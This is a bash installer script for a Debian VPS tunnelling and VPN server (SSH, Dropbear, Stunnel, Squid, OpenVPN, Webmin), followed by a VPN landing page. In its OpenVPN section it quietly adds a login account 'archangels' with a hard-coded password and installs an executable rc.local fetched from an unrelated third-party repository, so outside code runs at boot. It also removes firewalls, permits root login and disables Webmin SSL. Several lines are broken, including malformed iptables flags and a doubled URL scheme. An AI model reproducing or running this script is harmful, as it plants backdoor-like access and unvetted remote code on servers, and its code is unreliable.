#!/bin/bash
export DEBIAN_FRONTEND=noninteractive

#############################
# Script by VPSIIX
# Donations : https://paypal.me/ahmadfauzanhabibi
# Facebook: https://fb.com/ahmadfauzanhabibi
#############################
## WARNING: Do not modify or edit anything all Function or Variables used for this script is too sensitive. If you know what to do, you can be changed depends on your preferred values.
#############################
# Script name
MyScriptName='VPSIIX-AutoScriptDebian';

# Get IP Address
function ip_address(){
  local IP="$( ip addr | egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | egrep -v "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | head -n 1 )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipv4.icanhazip.com )"
  [ -z "${IP}" ] && IP="$( wget -qO- -t1 -T2 ipinfo.io/ip )"
  [ ! -z "${IP}" ] && echo "${IP}" || echo
} 
IPADDR="$(ip_address)";

# OpenSSH Ports
SSH_Port1='22';
SSH_Port2='143';

# Your SSH Banner
SSH_Banner='https://raw.githubusercontent.com/vpsiix/AutoScriptDebian/master/Files/Plugins/Banner';

# Dropbear Ports
Dropbear_Port1='109';
Dropbear_Port2='110';

# Stunnel Ports
Stunnel_Port1='443'; # through Dropbear
Stunnel_Port2='444'; # through OpenSSH

# Privoxy Ports
Privoxy_Port1='8888';
Privoxy_Port2='9999';

# Squid Ports
Squid_Port1='8000';
Squid_Port2='8080';

# Server local time
MyVPS_Time='Asia/Jakarta';
YearNow=`date +'%Y'`;

#############################
## WARNING: Do not modify or edit anything all Function or Variables used for this script is too sensitive. If you know what to do, you can be changed depends on your preferred values.
#############################
# Install Updates
#############################
apt-get -y install linuxlogo

# check registered ip
wget -q -O IPREG https://raw.githubusercontent.com/BangJaguh/jado/main/IPREG.txt
if ! grep -w -q $IPADDR IPREG; then
 linux_logo -l
 echo " "
 echo -e "\e[033;31m SORRY ... IP $IPADDR NOT REGISTERED for using this script\e[0m"
 rm -f IPREG
 sleep 5
 exit 1
fi

echo ""
linux_logo -l
echo ""
echo -e "\e[033;32m IP $IPADDR registered for using this script\e[0m"
sleep 5

# Removing some firewall tools that may affect other services
apt-get -y remove --purge ufw firewalld mariadb*;
 
# Adding Repository
apt-get -y install wget curl sudo sed
apt-get -y install gnupg1 gnupg2 apt-transport-https lsb-release ca-certificates openssl easy-rsa
echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" >> /etc/apt/sources.list
echo "deb http://download.webmin.com/download/repository sarge contrib" >> /etc/apt/sources.list
wget https://download.webmin.com/jcameron-key.asc
apt-key add jcameron-key.asc
wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
wget http://repo.mysql.com/mysql-apt-config_0.8.16-1_all.deb
apt-get -y install ./mysql-apt-config_0.8.16-1_all.deb
rm -r ./mysql-apt-config_0.8.16-1_all.deb
cd
apt-get update
 
# Installing some important machine essentials
apt-get -y install zip unzip nano build-essential
apt-get -y install tar gzip p7zip-full bzip2 bc rc git ccrypt mcrypt libmcrypt-dev libreadline-dev cron net-tools dnsutils dos2unix screen ngrep
 
# Now installing all our wanted services
apt-get -y install nginx ruby screenfetch

# Installing all required packages to install Webmin
apt-get -y install perl libnet-ssleay-perl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python dbus
apt-get -y install shared-mime-info jq
 
# install php
apt-get -y install php5.6 php5.6-fpm php5.6-cli php5.6-mysql php5.6-mcrypt
 
# Installing a text colorizer
gem install lolcat

# Trying to remove obsolette packages after installation
apt-get -y autoremove

# Install Webmin
apt-get -y --force-yes -f install libxml-parser-perl
apt-get -y install webmin
sed -i 's|ssl=1|ssl=0|g' /etc/webmin/miniserv.conf
sed -i 's/theme=authentic-theme/theme=gray-theme/g' /etc/webmin/config
sed -i 's/preroot=authentic-theme/preroot=gray-theme/g' /etc/webmin/miniserv.conf
 
# Then restart to take effect
systemctl restart webmin

#############################
## WARNING: Do not modify or edit anything all Function or Variables used for this script is too sensitive. If you know what to do, you can be changed depends on your preferred values.
#############################
# Configurating SSH
#############################

echo ""
linux_logo -l
echo ""
echo -e "\e[033;32m Configurating SSH\e[0m"
echo ""
sleep 2

# Removing some duplicated sshd server configs
rm -f /etc/ssh/sshd_config*
 
# Creating a SSH server config using cat eof tricks
cat <<'MySSHConfig' > /etc/ssh/sshd_config
# My OpenSSH Server config
Port myPORT1
Port myPORT2
AddressFamily inet
ListenAddress 0.0.0.0
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
PermitRootLogin yes
MaxSessions 1024
PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
ClientAliveInterval 240
ClientAliveCountMax 2
UseDNS no
Banner /etc/banner
AcceptEnv LANG LC_*
Subsystem   sftp  /usr/lib/openssh/sftp-server
MySSHConfig

# Now we'll put our ssh ports inside of sshd_config
sed -i "s|myPORT1|$SSH_Port1|g" /etc/ssh/sshd_config
sed -i "s|myPORT2|$SSH_Port2|g" /etc/ssh/sshd_config

# Download our SSH Banner
rm -f /etc/banner
wget -qO /etc/banner "$SSH_Banner"
dos2unix -q /etc/banner

# My workaround code to remove `BAD Password error` from passwd command, it will fix password-related error on their ssh accounts.
sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password
sed -i 's/use_authtok //g' /etc/pam.d/common-password

# Some command to identify null shells when you tunnel through SSH or using Stunnel, it will fix user/pass authentication error on HTTP Injector, KPN Tunnel, eProxy, SVI, HTTP Proxy Injector etc ssh/ssl tunneling apps.
sed -i '/\/bin\/false/d' /etc/shells
sed -i '/\/usr\/sbin\/nologin/d' /etc/shells
echo '/bin/false' >> /etc/shells
echo '/usr/sbin/nologin' >> /etc/shells
 
# Restarting openssh service
systemctl restart ssh

#############################
## WARNING: Do not modify or edit anything all Function or Variables used for this script is too sensitive. If you know what to do, you can be changed depends on your preferred values.
#############################
# Configurating Dropbar
#############################

echo ""
linux_logo -l
echo ""
echo -e "\e[033;32m Configurating Dropbear\e[0m"
echo ""
sleep 2

# install dropbear
apt-get -y install dropbear
 
# Removing some duplicate config file
rm -rf /etc/default/dropbear*
 
# creating dropbear config using cat eof tricks
cat <<'MyDropbear' > /etc/default/dropbear
# My Dropbear Config
NO_START=0
DROPBEAR_PORT=PORT01
DROPBEAR_EXTRA_ARGS="-p PORT02"
DROPBEAR_BANNER="/etc/banner"
DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"
DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"
DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
DROPBEAR_RECEIVE_WINDOW=65536
MyDropbear

# Now changing our desired dropbear ports
sed -i "s|PORT01|$Dropbear_Port1|g" /etc/default/dropbear
sed -i "s|PORT02|$Dropbear_Port2|g" /etc/default/dropbear
 
# Restarting dropbear service
systemctl restart dropbear

#############################
## WARNING: Do not modify or edit anything all Function or Variables used for this script is too sensitive. If you know what to do, you can be changed depends on your preferred values.
#############################
# Configurating Stunnel
#############################

echo ""
linux_logo -l
echo ""
echo -e "\e[033;32m Configurating STunnel\e[0m"
echo ""
sleep 2

# Install stunnel
apt-get -y install stunnel4

# Creating stunnel startup config using cat eof tricks
cat <<'MyStunnelD' > /etc/default/stunnel4
# My Stunnel Config
ENABLED=1
FILES="/etc/stunnel/*.conf"
OPTIONS=""
BANNER="/etc/banner"
PPP_RESTART=0
# RLIMITS="-n 4096 -d unlimited"
RLIMITS=""
MyStunnelD

# Removing all stunnel folder contents
rm -rf /etc/stunnel/*
 
# Creating stunnel certifcate using openssl
openssl req -new -x509 -days 9999 -nodes -subj "/C=ID/ST=Jawa Barat/L=Indramayu/O=$MyScriptName/OU=$MyScriptName/CN=$MyScriptName" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
##  > /dev/null 2>&1

# Creating stunnel server config
cat <<'MyStunnelC' > /etc/stunnel/stunnel.conf
# My Stunnel Config
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
client = no
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
TIMEOUTclose = 0

[dropbear]
accept = Stunnel_Port1
connect = 127.0.0.1:dropbear_port_c

[openssh]
accept = Stunnel_Port2
connect = 127.0.0.1:openssh_port_c
MyStunnelC

# setting stunnel ports
sed -i "s|Stunnel_Port1|$Stunnel_Port1|g" /etc/stunnel/stunnel.conf
sed -i "s|dropbear_port_c|$(netstat -tlnp | grep -i dropbear | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf
sed -i "s|Stunnel_Port2|$Stunnel_Port2|g" /etc/stunnel/stunnel.conf
sed -i "s|openssh_port_c|$(netstat -tlnp | grep -i ssh | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf

# Restarting stunnel service
systemctl restart stunnel4

# Allow IPv4 Forwarding
sed -i '/net.ipv4.ip_forward.*/d' /etc/sysctl.conf
sysctl --system &> /dev/null
 
# Enabling IPv4 Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

#############################
## WARNING: Do not modify or edit anything all Function or Variables used for this script is too sensitive. If you know what to do, you can be changed depends on your preferred values.
#############################
# Configurating Squid Privoxy
#############################

echo ""
linux_logo -l
echo ""
echo -e "\e[033;32m Configurating Privoxy\e[0m"
echo ""
sleep 2

#  openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget -O openvpn.tar "https://gakod.com/AUTOVPS/openvpn.tar"
tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
chmod +x /etc/rc.local
# etc
wget -O /home/vps/public_html/client.ovpn "https://gakod.com/AUTOVPS/client.ovpn"
wget -O /home/vps/public_html/udp.ovpn "https://gakod.com/AUTOVPS/udp.ovpn"
wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/BangJaguh/VPN/main/c/client1.ovpn"
wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
useradd -m -g users -s /bin/bash archangels
echo "7C22C4ED" | chpasswd
echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;

# Install Privoxy
apt-get -y install squid privoxy

# Removing Duplicate privoxy config
rm -rf /etc/privoxy/config*
 
# Creating Privoxy server config using cat eof tricks
cat <<'myPrivoxy' > /etc/privoxy/config
# My Privoxy Server Config
user-manual /usr/share/doc/privoxy/user-manual
confdir /etc/privoxy
logdir /var/log/privoxy
filterfile default.filter
logfile logfile
listen-address 0.0.0.0:Privoxy_Port1
listen-address 0.0.0.0:Privoxy_Port2
toggle 1
enable-remote-toggle 0
enable-remote-http-toggle 0
enable-edit-actions 0
enforce-blocks 0
buffer-limit 4096
enable-proxy-authentication-forwarding 1
forwarded-connect-retries 1
accept-intercepted-requests 1
allow-cgi-request-crunching 1
split-large-forms 0
keep-alive-timeout 5
tolerate-pipelining 1
socket-timeout 300
permit-access 0.0.0.0/0 IP-ADDRESS
myPrivoxy

# Setting machine's IP Address inside of our privoxy config(security that only allows this machine to use this proxy server)
sed -i "s|IP-ADDRESS|$IPADDR|g" /etc/privoxy/config
 
# Setting privoxy ports
sed -i "s|Privoxy_Port1|$Privoxy_Port1|g" /etc/privoxy/config
sed -i "s|Privoxy_Port2|$Privoxy_Port2|g" /etc/privoxy/config

# I'm setting Some Squid
rm -rf /etc/squid/sq*
cat <<'mySquid' > /etc/squid/squid.conf
acl localhost src 127.0.0.1/32 ::1
acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1
acl localnet src 10.0.0.0/8
acl localnet src 172.16.0.0/12
acl localnet src 192.168.0.0/16
acl localnet src fc00::/7
acl localnet src fe80::/10
acl SSL_ports port 80-8085
acl Safe_ports port 80
acl Safe_ports port 110
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 444
acl Safe_ports port 445
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
acl GET method GET
acl PUT method PUT
acl POST method POST
acl SSH dst IPADD-IPADD/32
http_access allow SSH
http_access allow localnet
http_access allow manager localhost
http_access deny manager
http_access allow localhost
http_access deny all
http_port Squid_Port1
http_port Squid_Port2
coredump_dir /var/spool/squid3
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname VPSIIX
mySquid
sed -i "s|Squid_Port1|$Squid_Port1|g" /etc/squid/squid.conf
sed -i "s|Squid_Port2|$Squid_Port2|g" /etc/squid/squid.conf
sed -i "s|IPADD|$IPADDR|g" /etc/squid/squid.conf

# Starting Proxy server
echo -e "Restarting proxy server.."
systemctl restart privoxy
systemctl restart squid
 
#############################
## WARNING: Do not modify or edit anything all Function or Variables used for this script is too sensitive. If you know what to do, you can be changed depends on your preferred values.
#############################
# Configurating Other Service
#############################

echo ""
linux_logo -l
echo ""
echo -e "\e[033;32m Configurating Service\e[0m"
echo ""
sleep 2

# Creating directory for startup script
rm -rf /etc/vpsiix
mkdir -p /etc/vpsiix
chmod -R 755 /etc/vpsiix
 
# Creating startup script using cat eof tricks
cat <<'EOFSH' > /etc/vpsiix/startup.sh
#!/bin/bash
# Setting server local time
ln -fs /usr/share/zoneinfo/MyVPS_Time /etc/localtime

# Prevent DOS-like UI when installing using APT (Disabling APT interactive dialog)
export DEBIAN_FRONTEND=noninteractive

# Allowing ALL TCP ports for our machine (Simple workaround for policy-based VPS)
iptables -A INPUT -s $IPADDR -p tcp -m multiport --dport 1:65535 -j ACCEPT
iptables -A INPUT -m string -iptables -Algo bm --string "BitTorrent" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string "BitTorrent protocol" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string "peer_id=" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string ".torrent" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string "announce.php?passkey=" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string "torrent" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string "info_hash" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string "/default.ida?" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string ".exe?/c+dir" -j REJECT
iptables -A INPUT -m string -iptables -Algo bm --string ".exe?/c_tftp" -j REJECT
iptables -A INPUT -m string --string "peer_id" -iptables -Algo kmp -j REJECT
iptables -A INPUT -m string --string "BitTorrent" -iptables -Algo kmp -j REJECT
iptables -A INPUT -m string --string "BitTorrent protocol" -iptables -Algo kmp -j REJECT
iptables -A INPUT -m string --string "bittorrentiptables -Announce" -iptables -Algo kmp -j REJECT
iptables -A INPUT -m string --string "announce.php?passkey=" -iptables -Algo kmp -j REJECT
iptables -A INPUT -m string --string "find_node" -iptables -Algo kmp -j REJECT
iptables -A INPUT -m string --string "info_hash" -iptables -Algo kmp -j REJECT
iptables -A INPUT -m string --string "get_peers" -iptables -Algo kmp -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string "BitTorrent" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string "BitTorrent protocol" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string "peer_id=" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string ".torrent" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string "announce.php?passkey=" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string "torrent" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string "info_hash" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string "/default.ida?" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string ".exe?/c+dir" -j REJECT
iptables -A FORWARD -m string -iptables -Algo bm --string ".exe?/c_tftp" -j REJECT
iptables -A FORWARD -m string --string "peer_id" -iptables -Algo kmp -j REJECT
iptables -A FORWARD -m string --string "BitTorrent" -iptables -Algo kmp -j REJECT
iptables -A FORWARD -m string --string "BitTorrent protocol" -iptables -Algo kmp -j REJECT
iptables -A FORWARD -m string --string "bittorrentiptables -Announce" -iptables -Algo kmp -j REJECT
iptables -A FORWARD -m string --string "announce.php?passkey=" -iptables -Algo kmp -j REJECT
iptables -A FORWARD -m string --string "find_node" -iptables -Algo kmp -j REJECT
iptables -A FORWARD -m string --string "info_hash" -iptables -Algo kmp -j REJECT
iptables -A FORWARD -m string --string "get_peers" -iptables -Algo kmp -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string "BitTorrent" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string "BitTorrent protocol" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string "peer_id=" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string ".torrent" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string "announce.php?passkey=" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string "torrent" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string "info_hash" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string "/default.ida?" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string ".exe?/c+dir" -j REJECT
iptables -A OUTPUT -m string -iptables -Algo bm --string ".exe?/c_tftp" -j REJECT
iptables -A OUTPUT -m string --string "peer_id" -iptables -Algo kmp -j REJECT
iptables -A OUTPUT -m string --string "BitTorrent" -iptables -Algo kmp -j REJECT
iptables -A OUTPUT -m string --string "BitTorrent protocol" -iptables -Algo kmp -j REJECT
iptables -A OUTPUT -m string --string "bittorrentiptables -Announce" -iptables -Algo kmp -j REJECT
iptables -A OUTPUT -m string --string "announce.php?passkey=" -iptables -Algo kmp -j REJECT
iptables -A OUTPUT -m string --string "find_node" -iptables -Algo kmp -j REJECT
iptables -A OUTPUT -m string --string "info_hash" -iptables -Algo kmp -j REJECT
iptables -A OUTPUT -m string --string "get_peers" -iptables -Algo kmp -j REJECT

# Deleting Expired SSH Accounts
/usr/local/sbin/delete_expired &> /dev/null
EOFSH
chmod +x /etc/vpsiix/startup.sh
 
# Setting server local time every time this machine reboots
sed -i "s|MyVPS_Time|$MyVPS_Time|g" /etc/vpsiix/startup.sh
rm -rf /etc/sysctl.d/99*

# Setting our startup script to run every machine boots 
echo "[Unit]
Description=vpsiix Startup Script
Before=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/vpsiix/startup.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/vpsiix.service
chmod +x /etc/systemd/system/vpsiix.service
systemctl daemon-reload
systemctl start vpsiix
systemctl enable vpsiix &> /dev/null

# Rebooting cron service
systemctl restart cron
systemctl enable cron

# Configurating Menu
echo -e " Creating Menu scripts.."
cd /usr/local/sbin/
rm -rf {accounts,base-ports,base-ports-wc,base-script,bench-network,clearcache,connections,create,create_random,create_trial,delete_expired,diagnose,edit_dropbear,edit_openssh,edit_openvpn,edit_ports,edit_squid3,edit_stunnel4,locked_list,menu,options,ram,reboot_sys,reboot_sys_auto,restart_services,server,set_multilogin_autokill,set_multilogin_autokill_lib,show_ports,speedtest,user_delete,user_details,user_details_lib,user_extend,user_list,user_lock,user_unlock}
wget -q https://https://github.com/vpsiix/AutoScriptDebian/raw/master/Files/Menu/bashmenu.zip
unzip -q bashmenu.zip
rm -f bashmenu.zip
chmod +x ./*
dos2unix ./* &> /dev/null
sed -i 's|/etc/squid/squid.conf|/etc/privoxy/config|g' ./*
sed -i 's|http_port|listen-address|g' ./*
cd

#############################
## WARNING: Do not modify or edit anything all Function or Variables used for this script is too sensitive. If you know what to do, you can be changed depends on your preferred values.
#############################
# Configurating Web Server
#############################

echo ""
linux_logo -l
echo ""
echo -e "\e[033;32m Configurating Web Server\e[0m"
echo ""
sleep 2

# Configure Nginx
sed -i 's/\/var\/www\/html;/\/home\/vps\/public_html\/;/g' /etc/nginx/sites-enabled/default
cp /var/www/html/index.nginx-debian.html /home/vps/public_html/index.html
mkdir -p /home/vps/public_html
cat > /home/vps/public_html/index.html <<-END
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Embex VPN</title>
        <meta name="description" content="Use Embex VPN for free!" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <!--Bootstrap 4-->
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="https://raw.githubusercontent.com/radzvpn/TNTNOLOADDNS/master/animate.min.css">
        <!--icons-->
        <link rel="stylesheet" href="https://raw.githubusercontent.com/radzvpn/TNTNOLOADDNS/master/ionicons.min.css" />
    </head>
    <body>
        <!--header-->
        <nav class="navbar navbar-expand-md navbar-dark fixed-top sticky-navigation">
            <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
                <span class="ion-grid icon-sm"></span>
            </button>
            <a class="navbar-brand hero-heading" href="#">Embex VPN</a>
            <div class="collapse navbar-collapse" id="navbarCollapse">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item mr-3">
                        <a class="nav-link page-scroll" href="#main">Home<span class="sr-only">(current)</span></a>
                    </li>
                    <li class="nav-item mr-3">
                        <a class="nav-link page-scroll" href="#features">Features</a>
                    </li>
                    <li class="nav-item mr-3">
                        <a class="nav-link page-scroll" href="#configs">Configs</a>
                    </li>
                    <li class="nav-item mr-3">
                        <a class="nav-link page-scroll" href="#download">VPN App</a>
                    </li>
					<li class="nav-item mr-3">
                        <a class="nav-link page-scroll" href="#team">Our Team</a>
                    </li>
                    <li class="nav-item mr-3">
                        <a class="nav-link page-scroll" href="#links">Links</a>
                    </li>
                    <li class="nav-item mr-3">
                        <a class="nav-link page-scroll" href="#contact">Contact</a>
                    </li>
                </ul>
            </div>
        </nav>

        <!--main section-->
        <section class="bg-texture hero" id="main">
            <div class="container">
                <div class="row d-md-flex brand">
                    <div class="col-md-6 hidden-sm-down wow fadeIn">
                        <img class="img-fluid mx-auto d-block" src="img/product.png"/>
                    </div>
                    <div class="col-md-6 col-sm-12 text-white wow fadeIn">
                        <h2 class="pt-4">Experience <b class="text-primary-light">Embex VPN </b> for FREE</h2>
                        <p class="mt-5">
                            The best gets even better. With our swift and fastest low ping private server, you'll not being worried again with our vpn services.
                        </p>
                        <p class="mt-5">
                            <a href="#configs" class="btn btn-primary mr-2 mb-2 page-scroll">Try Now</a>
                            <a href="#download" class="btn btn-white mb-2 page-scroll">Download App</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>

        <!--features-->
        <section class="bg-light" id="features">
            <div class="container">
                <div class="row mb-3">
                    <div class="col-md-6 col-sm-8 mx-auto text-center wow fadeIn">
                        <h2 class="text-primary">Amazing Features of Embex VPN</h2>
                        <p class="lead mt-4">
                            A plenty of awesome features to <br/>wow the users.
                        </p>
                    </div>
                </div>
                <div class="row mt-5 text-center">
                    <div class="col-md-4 wow fadeIn">
                        <div class="card">
                            <div class="card-body">
                                <div class="icon-box">
                                    <em class="ion-ios-game-controller-b-outline icon-md"></em>
                                </div>
                                <h6>Unlimited Gaming</h6>
                                <p>
                                    Low ping & Optimized server for your best unlimited gaming experience. 
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 wow fadeIn">
                        <div class="card">
                            <div class="card-body">
                                <div class="icon-box">
                                    <em class="ion-android-wifi icon-md"></em>
                                </div>
                                <h6>Cloudflare DNS</h6>
                                <p>
                                    With the best DNS installed in our server to keep your connection at stable, streaming faster, download accelerated, & uploading boosted. 
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 wow fadeIn">
                        <div class="card">
                            <div class="card-body">
                                <div class="icon-box">
                                    <em class="ion-ios-settings icon-md"></em>
                                </div>
                                <h6>Advanced Configs</h6>
                                <p>
                                    All our SSH/OVPN/DROPBEAR/SSL are highly configurable to meet your VPN experience & satisfaction. 
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 wow fadeIn">
                        <div class="card">
                            <div class="card-body">
                                <div class="icon-box">
                                    <em class="ion-ios-cloud-upload-outline icon-md"></em>
                                </div>
                                <h6>Unlimited Bandwidth</h6>
                                <p>
                                    No capping and you can download/stream/browse all what you want without limitations. 
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 wow fadeIn">
                        <div class="card">
                            <div class="card-body">
                                <div class="icon-box">
                                    <em class="ion-ios-locked-outline icon-md"></em>
                                </div>
                                <h6>Highly Secure</h6>
                                <p>
                                    Our server is from best VPS Cloud service, with anti-torrent & anti-ddos installed for our servers go for a longer last. 
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 wow fadeIn">
                        <div class="card">
                            <div class="card-body">
                                <div class="icon-box">
                                    <em class="ion-android-color-palette icon-md"></em>
                                </div>
                                <h6>More Features & Colors</h6>
                                <p>
                                    With more future plans coming to keep this server colored and beautiful. 
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section class="bg-white p-0">
            <div class="container-fluid">
                <div class="row d-md-flex mt-5">
                    <div class="col-sm-6 p-0 wow fadeInLeft">
                        <img class="img-fluid" src="img/whyus.png" alt="Why we Choose us">
                    </div>
                    <div class="col-sm-6 pl-5 pr-5 pt-5 pb-4 wow fadeInRight">
                        <h3><a href="#"></a></h3>
                        <p class="lead pt-4">VPN (virtual private network) is a technology that could make internet access you comfortable with eliminating prevention in accessing all sites. Giving new anonymous identity, disguise your original location and encrypts all traffic, such things make all data access and secure internet. Internet service provider or network operator, even the government, will not be able to check or filter your activity on the web.</p>
						Why you choose Embex VPN?
                        <ul class="pt-4 pb-3 list-default">
                            <li><font color="green"><b>FREE at all</b></font></li>
                            <li>Anonymous</li>
                            <li>Safe</li>
                            <li>Fast</li>
                            <li>Low Ping</li>
                            <li>Smooth</li>
                            <li>The best of the BEST!</li>
                        </ul>
                        <a href="#configs" class="btn btn-primary mr-2 page-scroll">Get Started with Embex VPN</a>
                    </div>
                </div>
            </div>
        </section>

        <!--pricing-->
        <section class="bg-light" id="configs">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 offset-md-3 col-sm-8 offset-sm-2 col-xs-12 text-center">
                        <h2 class="text-primary">Configs</h2>
                        <p class="lead pt-3">
                            Our OpenVPN configs.
                        </p>
                    </div>
                </div>
                <div class="row d-md-flex mt-4 text-center">
                    <div class="col-sm-4 mt-4 wow fadeIn">
                        <div class="card">
                            <div class="card-body">
                                <h5 class="card-title pt-4 text-orange">OpenVPN</h5>
                                <h3 class="card-title text-primary pt-4">TCP</h3>
                                <p class="card-text text-muted pb-3 border-bottom">Default Config</p>
                                <ul class="list-unstyled pricing-list">
                                    <li>Port: 1153</li>
                                    <li>TCP Connection</li>
                                    <li>Stable</li>
                                    <li>Fast &amp; Smooth</li>
                                </ul>
                                <a href="/client.ovpn" class="btn btn-primary btn-radius">Download</a>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-4 mt-0 wow fadeIn">
                        <div class="card pt-4 pb-4">
                            <div class="card-body">
                                <h5 class="card-title pt-4 text-orange">OpenVPN</h5>
                                <h3 class="card-title text-primary pt-4"><sup></sup>SSL</h3>
                                <p class="card-text text-muted pb-3 border-bottom">Default config</p>
                                <ul class="list-unstyled pricing-list">
                                    <li>Port: 443</li>
                                    <li>OpenVPN over SSL</li>
                                    <li>Stable</li>
                                    <li>Fast &amp; Smooth</li>
                                </ul>
                                <a href="/clientssl.ovpn" class="btn btn-primary btn-radius">Download</a>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-4 mt-4 wow fadeIn">
                        <div class="card">
                            <div class="card-body">
                                <h5 class="card-title pt-4 text-orange">OpenVPN Package <small class="badge bg-primary small-xs">HOT</small></h5>
                                <h3 class="card-title text-primary pt-4"><sup></sup>Combo</h3>
                                <p class="card-text text-muted pb-3 border-bottom">zip packed</p>
                                <ul class="list-unstyled pricing-list">
                                    <li>TCP &amp; SSL</li>
                                    <li>With stunnel.conf</li>
                                    <li>For modem used</li>
                                    <li>Zip packed</li>
                                </ul>
                                <a href="/openvpn.zip" class="btn btn-primary btn-radius">Download</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!--download-->
        <section class="bg-orange pt-0" id="download">
            <div class="container">
                <div class="row d-md-flex text-center wow fadeIn">
                    <div class="col-md-6 offset-md-3 col-sm-10 offset-sm-1 col-xs-12">
                        <h5 class="text-primary">Download Our Mobile App</h5>
                        <p class="mt-4">
                            Download our provided apps for free for your android phone & pc.
                            
                        <p class="mt-5">
                            RADZ VPN<br><a href="https://play.google.com/store/apps/details?id=youpz.vpn.ssh" class="mr-2" target="_blank"><img src="img/google-play.png" class="store-img"/></a><br>
